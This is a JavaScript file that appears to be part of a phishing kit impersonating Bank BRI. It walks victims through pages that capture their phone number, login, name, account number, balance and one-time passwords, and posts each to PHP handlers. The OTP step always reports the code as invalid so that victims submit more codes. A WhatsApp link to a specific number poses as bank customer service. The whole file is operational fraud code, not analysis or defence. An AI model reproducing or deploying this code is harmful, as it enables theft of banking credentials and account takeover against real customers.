function sendHp() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
        type: 'POST',
        url: 'req/no.php',
        data: $('#index').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "login.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};



function sendLogin() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/login.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "saldo.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#rek').val();
            sessionStorage.setItem('rek', rek);
         }, 500);
      }
   });
};


function sendSaldo() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "otp.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#rek').val();
            sessionStorage.setItem('rek', rek);
            var saldo = $('#saldo').val();
            sessionStorage.setItem('saldo', saldo);
         }, 400);
      }
   });
};
        

// Kirim OTP
function sendOtp() {
   event.preventDefault();
   $("#loader").fadeIn();
   $(".btn-primary").prop("disabled", true);
      
   $.ajax({
        type: 'POST',
        url: 'req/otp.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',
      complete: function() {
         $("#loader").fadeOut();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").html("Kode aktivasi tidak valid!<br>Silakan coba lagi.").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      
   });
};        

$(document).ready(function() {
    $('#getcs').click(function() {
    $("#process1").show();
 $('.load').fadeIn();
    setTimeout(function(){      
location.href='https://wa.me/6282182480632?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
  });   
